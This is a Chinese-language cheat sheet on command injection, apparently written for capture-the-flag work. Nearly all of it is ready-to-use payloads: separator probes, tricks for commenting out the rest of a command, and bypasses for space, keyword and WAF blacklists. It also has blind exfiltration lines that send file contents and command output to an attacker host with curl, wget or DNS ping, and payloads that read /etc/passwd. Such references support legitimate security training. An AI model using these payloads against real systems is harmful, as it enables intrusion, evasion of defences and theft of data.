# 命令注入

## 探测

```
;id      |id      ||id     &&id     `id`     $(id)
%0aid    %0did    （换行分隔）
;sleep 3         （无回显时用时间）
```

在参数里逐个插，观察：输出里是否多出命令结果 / 是否多出 3 秒 / 是否 500。

## 拼接位置决定 payload 形状

```bash
# 形如 tar -czf /tmp/{name}.gz /var/log/{svc}.log
name=x;id;#            # ;# 注释掉尾部（bash 里 # 前面要有空格或 ;）
name=x;id;%23          # URL 里 # 要编码
name=x$(id)            # 在双引号里
name=`id`              # 反引号
name=x|id              # 管道
name=x&&id
```

**注释尾部是最关键的一步**：不加注释，后半段 `.gz /var/log/...` 会把你的命令当参数吃掉。

## 无回显怎么办

```bash
;sleep 5                      # 时间侧信道
;curl http://你/$(id|base64)   # 出网（题目多禁出网，先试回显）
;id > /var/www/html/x.txt     # 写到可访问文件，再 GET 回来
;ping -c1 `whoami`.你的域名     # DNS 外带
```

## 过滤绕过

| 过滤 | 绕过 |
|---|---|
| 空格 | `${IFS}`、`$IFS$9`、`<`、`%09`、`{cat,flag}` |
| 关键字 cat/flag | `c\at`、`ca""t`、`$'cat'`、`/bin/c?t`、`$(printf ca)t` |
| 斜杠 | `${PATH:0:1}`、`$(printf '\57')` |
| 只过滤小写 | `CAT`、`CaT` |
| 长度限制 | 分段写文件再执行；`echo base64|base64 -d|sh` |

## 常见注入点

- 系统/网络工具：ping、traceroute、nslookup、curl、wget、tar、zip、ffmpeg、ImageMagick、git
- "归档/备份/导出"类功能（文件名参数最常被拼进命令）
- 日志处理、图片转换、PDF 生成（走外部命令时）

## 边界设备/关键字黑名单：整条命令被拦时怎么走

现象：`127.0.0.1` 正常，一加 `;id`、`&&id`、`|id` 就 403。
说明拦的不是「分隔符」，而是**命令名 + 分隔符的组合规则**（常见是 `(;|\||&|`) + (cat|ls|id|whoami)` 一起匹配）。

破解顺序：

**① 换一个同义命令（最有效）**

| 想干 | 被拦 | 换成 |
|---|---|---|
| 读文件 | `cat f` | `tac f` / `head f` / `tail f` / `more f` / `less f` / `nl f` / `od -c f` / `awk 1 f` / `sed -n '1,$p' f` / `paste f` / `strings f` |
| 列目录 | `ls` | `dir` / `find . -maxdepth 1` / `printf '%s\n' *` / `echo /*` |
| 看身份 | `id` | `whoami`(也可能拦) / `w` / `ps -ef` / `cat /proc/self/status` |
| 拼路径 | `cat /etc/passwd` | `tac /etc/passwd`、`head -c 999 /etc/passwd` |

**② 破坏关键字本身（引号/转义/通配符）**

```bash
c\at  /flag           # 反斜杠
c''at /flag           # 空引号拼接（shell 里等价于 cat）
c""at /flag
/bin/c?t /flag        # 通配符
/bin/c[a]t /flag
/???/??t /flag        # 整条路径通配
```

**③ 命令用变量拼出来**

```bash
a=ca;b=t;$a$b /flag
X=cat;$X /flag
${PATH:0:1}bin...     # 取 PATH 的第一个字符拼 /
```

**④ 分隔符本身被拦时**

```bash
%0a  换行            # 很多 WAF 只看单行
%0d%0a
${IFS}               # 代替空格，也常能代替分隔
;  →  \n
|  →  ||
&& → %26%26（编码后由后端解码）
2>&1                 # 借重定向把管道拆开
```

**⑤ 无回显时**

```bash
;curl http://your-host/$(cat /flag | base64 -w0)
;wget -qO- http://your-host/`id`
;sleep 5               # 先确认注入成立，再折腾外带
```

## 判定「拦的是内容还是格式」

同一参数发三种：

1. `127.0.0.1` —— 基线
2. `127.0.0.1;` —— 纯分隔符
3. `127.0.0.1;xxx`（xxx 是随机串） —— 分隔符 + 无害词

- 2、3 都 403 → **分隔符被拦**，走 ④
- 3 才 403、换成 `;tac` / `;head` 就通 → **关键字黑名单**，走 ①②③
- 全 200 但没回显 → 命令执行了但输出没回来，走 ⑤

## 目标命令本身注定失败时（最容易被忽略的一类）

网络诊断类功能（ping/traceroute）在容器里常**没有原始套接字权限**：
即使输入合法，命令也返回非 0（`ping: Operation not permitted`）。由此产生两个后果：

1. **`&&` 后面永远不执行** —— 被前一条命令的非 0 返回码短路。
   要么用 `;`/换行（若未被过滤），要么用 `&`（后台执行，输出会丢，只能用副作用）。
2. **输出里永远带着那条报错**，判读时先把这段噪声剥掉，再找自己的结果。

```bash
# 正确姿势：换行追加独立命令（%0A 只编码一次）
host=<合法IP>%0Aid
host=<合法IP>%0Auname%20-a
```

- 换行**只能编码一次**：二次编码后后端拿到的是字面量 `%0A`，不会变成换行；
- 表单/QueryString 两种提交方式都试，`parse_str` 与 multipart 对换行的处理不一样；
- 想要**长输出**（读文件、列目录）时，换行后面接的是完整命令即可，输出会整段回显；
  而 `$(...)` 这种"把结果塞进参数"的方式只能拿到一行、且会被后续解析报错包住，只适合短探测：

```bash
# 短探测：结果会被塞进命令参数，回显在 "Name or service not known" 一类报错里
host=<合法IP>$(id)
host=<合法IP>$(base64 -w0 /etc/hostname)   # 单行无空格，最稳
```

## 黑名单粒度速查（先测"什么被拦"）

对着同一个参数发下面几组，只看返回是否有差异：

| 发送 | 说明 |
|---|---|
| 合法值 | 基线 |
| 合法值 + 单个分隔符 | 判断该分隔符是否被拦 |
| 合法值 + 分隔符 + 随机串 | 区分"拦分隔符"还是"拦关键字组合" |

常见结果（同一系统里的典型组合）：`;` `|` `` ` `` `&&` `<` `>` 被拦，
而 `&`、`$()`、换行、引号、括号可用。**能用的分隔符往往只有一个，找到它就够了。**
